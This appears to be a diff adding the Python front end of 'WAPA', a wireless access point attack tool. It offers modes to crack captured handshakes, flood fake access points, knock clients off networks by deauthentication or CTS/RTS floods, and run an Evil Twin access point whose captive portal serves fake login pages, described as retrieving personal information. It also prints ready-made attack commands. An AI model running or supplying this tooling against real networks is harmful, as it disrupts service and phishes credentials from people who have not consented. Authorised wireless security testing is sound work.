@@ -1,0 +1,354 @@
+#!/usr/bin/python3
+# -.- coding: utf-8 -.-
+from time import sleep
+import os
+import argparse
+import sys
+import subprocess
+import sqlite3
+import pandas
+from termcolor import colored
+from random import randint
+import signal
+import textwrap
+
+#################################################################
+
+random_title=randint(1,2)
+colores = ["red", "green", "yellow", "blue", "cyan", "magenta", "yellow", "white"]
+random_color_title=randint(0,7)
+titulo1="""
+ __     __     ______     ______   ______
+/\ \  _ \ \   /\  __ \   /\  == \ /\  __ \ 
+\ \ \/ ".\ \  \ \  __ \  \ \  _-/ \ \  __ \ 
+ \ \__/".~\_\  \ \_\ \_\  \ \_\    \ \_\ \_\ 
+  \/_/   \/_/   \/_/\/_/   \/_/     \/_/\/_/
+
+"""
+titulo2="""
+███       ███╗  █████████╗  ████████╗  █████████╗
+███  ▄▄▄  ███║  ███   ███║  ███  ███║  ███   ███║
+███  ███  ███║  █████████║  ████████║  █████████║
+███▄▄███▄▄███║  ███╔══███║  ███╔════╝  ███╔══███║
+█████████████║  ███║  ███║  ███║       ███║  ███║
+╚════════════╝  ╚══╝  ╚══╝  ╚══╝       ╚══╝  ╚══╝
+"""
+if random_title == 1:
+	print(colored(titulo1,colores[random_color_title]))
+else:
+	print(colored(titulo2,colores[random_color_title]))
+
+#################################################################
+
+#sys.tracebacklimit=0
+
+version = """
+			 ┌───────────────────────────────
+			 │
+  WAPA version 1.0       │   Wireless Access Point Auditor
+			 │
+    Made by: D0t         │  https://github.com/D-0x0-t/wapa
+			 │
+─────────────────────────┘"""
+
+#################################################################
+
+class SmartFormatter(argparse.HelpFormatter):
+	def _split_lines(self, text, width):
+		if text.startswith('R|'):
+			return text[2:].splitlines()
+		return argparse.HelpFormatter._split_lines(self, text, width)
+
+parser = argparse.ArgumentParser(formatter_class=SmartFormatter)
+
+parser.add_argument("-m", "--mode", help="R|Define what to do. Active modules are:\n"
+"  scan     :  Sniff beacons to determine near networks\n"
+"  crack    :  Crack the handshake stored in a cap/pcap file\n"
+"  fuzz     :  Fill the air with fake APs\n"
+"  dos      :  Perform a denial of service\n"
+"  eviltwin :  Perform a EvilTwin attack\n"
+"  example  :  Print example commands to use")
+
+grupo_gen = parser.add_argument_group("General purpose arguments", description="arguments that might be used in all executions")
+grupo_gen.add_argument("-i", "--interface", help="Define interface to use")
+grupo_gen.add_argument("-c", "--channel", help="Detemine channel to sniff / use")
+grupo_gen.add_argument("-v", "--verbose", help="Verbosity", action="store_true")
+grupo_gen.add_argument("-V", "--version", help="Prints program version and exit", action="store_true")
+
+grupo_sniff = parser.add_argument_group("Scanner options", description="arguments for sniffing networks")
+grupo_sniff.add_argument("-t", "--type", help="R|Scanner type. Available are:\n"
+"table    :  Perform the scan using scapy\n"
+"airodump :  Perform the scan using airodump\n", default="table")
+grupo_sniff.add_argument("-o", "--outfile", help="Write output in 'handshake/<filename>'")
+grupo_sniff.add_argument("-db", "--database", help="Store data in a database", action="store_true")
+
+grupo_crack = parser.add_argument_group("Cracking options", description="arguments required for cracking a handshake")
+grupo_crack.add_argument("-f", "--file", help="Input file")
+grupo_crack.add_argument("-w", "--wordlist", help="Path to the wordlist to use")
+#grupo_crack.add_argument("--cracker", help="Choose between john and aircrack")
+
+grupo_fuzz = parser.add_argument_group("Fuzzing options", description="argument used for fuzzing")
+grupo_fuzz.add_argument("-r", "--read", help="Use file as a wordlist for the fuzzer")
+
+grupo_dos = parser.add_argument_group("Denial of Service options", description="arguments used for denying service")
+grupo_dos.add_argument("-dt", "--dos-type", help="R|Denial of Service attack type. Supported are:\n"
+"ddos: Deauth DoS\n"
+"crfdos: CTS/RTS Flood DoS")
+grupo_dos.add_argument("-s", "--source", help="Source MAC address")
+
+grupo_et = parser.add_argument_group("Evil Twin options", description="arguments used to perform an Evil Twin")
+#grupo_et.add_argument("-k", "--host", help="Set host AP interface")
+grupo_et.add_argument("-x", "--exit", help="Set the interface that will route the packets to the Internet")
+grupo_et.add_argument("-e", "--essid", help="Define the AP ESSID (default: freeWiFi)", default="freeWiFi")
+grupo_et.add_argument("-cp", "--captive-portal", help="Start a captive portal to retrieve personal information", action="store_true")
+grupo_et.add_argument("-web", "--webserver", help="Determine webserver to use (located in /usr/sbin/mitm_webserver) (default: google-loin)", default="google-login")
+grupo_et.add_argument("-wpa2", "--wpa2-passphrase", help="Specify a password for the WPA2 ciphered AP")
+
+args = parser.parse_args()
+
+#Version
+show_version = args.version
+
+#General args
+mode = args.mode
+intf = args.interface
+channel = args.channel
+verb = args.verbose
+
+#Sniffer args
+type = args.type
+write = args.outfile
+db = args.database
+
+#Cracking args
+file = args.file
+wordlist = args.wordlist
+
+#Fuzzing args
+fuzzing_wordlist = args.read
+
+#DoS args
+dos_type = args.dos_type
+dos_source = args.source
+
+#EvilTwin args
+#host = args.host
+exit = args.exit
+essid = args.essid
+cportal = args.captive_portal
+webserver = args.webserver
+security = args.wpa2_passphrase
+
+#################################################################
+
+if show_version is True:
+	print(version)
+	sys.exit(0)
+
+def handler(signum, frame):
+	print("")
+	print("[*] Ctrl-C pressed, exitting...")
+	os.system(f"/usr/sbin/wapamon stop {intf} > /dev/null")
+	os.system("tput cnorm")
+
+#################################################################
+##########                    Main                     ##########
+#################################################################
+
+os.system("tput civis")
+
+if mode == "scan":
+	if channel is not None:
+		scan_channel = (f" -c {channel}")
+	else:
+		scan_channel = ""
+
+	if db is True:
+		scan_db = "-db -s"
+	else:
+		scan_db = ""
+
+	if write is not None:
+		scan_write = (f" -w {write}")
+	else:
+		scan_write = ""
+
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon start {intf}")
+	else:
+		print(f"[+] Setting up {intf}")
+		os.system(f"/usr/sbin/wapamon start {intf} > /dev/null")
+
+	if type == "table":
+		wapascan_table = (f"wapascan {type} {intf}{scan_channel} -i 0.5 {scan_db}")
+		os.system(wapascan_table)
+	elif type == "airodump":
+		wapascan_airo = (f"wapascan {type} {intf}{scan_channel}{scan_write}")
+		os.system(wapascan_airo)
+
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon stop {intf}")
+	else:
+		print("")
+		print(f"[+] Disabling monitor mode on {intf}")
+		os.system(f"/usr/sbin/wapamon stop {intf} > /dev/null")
+elif mode == "crack":
+	if file is None:
+		print("[-] No file specified, exiting...")
+		sys.exit(1)
+
+	if wordlist is None:
+		print("[-] Aircrack requires a wordlist, please specify one")
+		sys.exit(1)
+	else:
+		crack_aircrack = (f"wapattack_crack B -r {file} -w {wordlist}")
+		os.system(crack_aircrack)
+elif mode == "fuzz":
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon start {intf}")
+	else:
+		print(f"[+] Setting up {intf}")
+		os.system(f"/usr/sbin/wapamon start {intf} > /dev/null")
+		print("")
+		print("[+] Starting attack!")
+
+	if verb is True:
+		fuzz_verb = " -v"
+	else:
+		fuzz_verb = ""
+
+	if channel is not None:
+		fuzz_channel = (f" -c {channel}")
+	else:
+		fuzz_channel = ""
+
+	if fuzzing_wordlist is None:
+		fuzzer = (f"wapattack_fuzzer {intf}{fuzz_channel}{fuzz_verb}")
+	else:
+		fuzz_wordlist = (f" -f {fuzzing_wordlist}")
+		fuzzer = (f"wapattack_fuzzer {intf}{fuzz_channel}{fuzz_wordlist}{fuzz_verb}")
+
+	os.system(fuzzer)
+
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon stop {intf}")
+	else:
+		print("")
+		print(f"[+] Disabling monitor mode on {intf}")
+		os.system(f"/usr/sbin/wapamon stop {intf} > /dev/null")
+elif mode == "dos":
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon start {intf}")
+		dos_verb = " -v"
+	else:
+		print(f"[+] Setting up {intf}")
+		os.system(f"/usr/sbin/wapamon start {intf} > /dev/null")
+		print("")
+		print("[+] Starting attack!")
+		dos_verb = ""
+
+	if dos_source is None:
+		print("")
+		print("[+] Capturing BSSIDs... Please wait")
+		devnull = open("/dev/null", 'w')
+		wapascan_subp_cmd = (f"wapascan table {intf} -i 0.5 -db")
+		wapascan_subp = subprocess.Popen(wapascan_subp_cmd, stdout=devnull, shell=True)
+		wapascan_subp_pid = wapascan_subp.pid
+		sleep(1.5)
+		os.system("wapa_animated_sequence")
+		sleep(1.5)
+		os.kill(wapascan_subp_pid, signal.SIGINT)
+		print("[+] Captured networks were:")
+		sleep(1)
+		db_con = sqlite3.connect("database/wapascan.db")
+		table = pandas.read_sql_query("SELECT bssid,essid,channel,crypto FROM SCAN GROUP BY essid ORDER BY essid", db_con)
+		print(table)
+		db_con.close()
+		print("")
+		print("")
+		dos_source = input("Please, specify the network you want to attack: ")
+		sleep(0.5)
+		print("[+] Preparing to send packets")
+
+	if dos_type == "ddos":
+		dos_cmd = (f"wapattack_dos ddos {intf} -s {dos_source} -b -i 0.25{dos_verb}")
+	elif dos_type == "crfdos":
+		dos_cmd = (f"wapattack_dos crfdos {intf} -f CTS -d {dos_source} -i 0.25{dos_verb}")
+
+	os.system(dos_cmd)
+
+	if verb is True:
+		os.system(f"/usr/sbin/wapamon stop {intf}")
+	else:
+		print("")
+		print(f"[+] Disabling monitor mode on {intf}")
+		os.system(f"/usr/sbin/wapamon stop {intf} > /dev/null")
+elif mode == "eviltwin":
+	if intf is None:
+		print("[-] Host interface must be defined")
+		print("[-] Exitting...")
+		sys.exit(1)
+
+	if exit is None:
+		print("[-] Exit interface must be defined")
+		print("[-] Exitting...")
+		sys.exit(1)
+
+	if cportal is not None:
+		cap_portal_cmd = (f" -m -w {webserver}")
+	else:
+		cap_portal_cmd = ""
+
+	if security is not None:
+		ap_security = (f" -s WPA2 -p {security}")
+	else:
+		ap_security = ""
+
+	if channel is not None:
+		et_channel = (f" -c {channel}")
+	else:
+		et_channel = " -c 1"
+
+	if verb is True:
+		et_verb = " -v"
+	else:
+		et_verb = " -q"
+
+	eviltwin_cmd = (f"wapattack_et -k {intf} -x {exit}{et_channel} -e '{essid}'{ap_security}{et_verb}{cap_portal_cmd}")
+	os.system(eviltwin_cmd)
+elif mode == "example":
+	print("""		     ╔════════════════╗
+		     ║ Basic examples ║
+		     ╚════════════════╝
+
+ ┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃  Attack-Mode  ┃             Example Command              ┃
+ ┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+ │     Scan      │          wapa -m scan -i wlan0           │
+ ├───────────────┼──────────────────────────────────────────┤
+ │    Crack      │ wapa -m crack -f file.cap -w rockyou.txt │
+ ├───────────────┼──────────────────────────────────────────┤
+ │     Fuzz      │          wapa -m fuzz -i wlan0           │
+ ├───────────────┼──────────────────────────────────────────┤
+ │     DoS       │    wapa -m dos -i wlan0 -c 1 -dt dos     │
+ ├───────────────┼──────────────────────────────────────────┤
+ │   EvilTwin    │   wapa -m eviltwin -i wlan0 -x eth0 -cp  │
+ └───────────────┴──────────────────────────────────────────┘
+""")
+	print("")
+	print("""
+                              ╔═══════════════════╗
+                              ║ Advanced examples ║
+                              ╚═══════════════════╝
+
+ ┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃  Attack-Mode  ┃                     Example Command                      ┃
+ ┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+ │     Scan      │         wapa -m scan -i wlan0 -c 1 -t table --db         │
+ ├───────────────┼──────────────────────────────────────────────────────────┤
+ │     DoS       │  wapa -m dos -i wlan0 -c 1 -dt dos -s 00:11:22:33:44:55  │
+ ├───────────────┼──────────────────────────────────────────────────────────┤
+ │   EvilTwin    │ wapa -m eviltwin -i wlan0 -x eth0 -cp -web rogue_ap -c 1 │
+ └───────────────┴──────────────────────────────────────────────────────────┘
+""")
+os.system("tput cnorm")
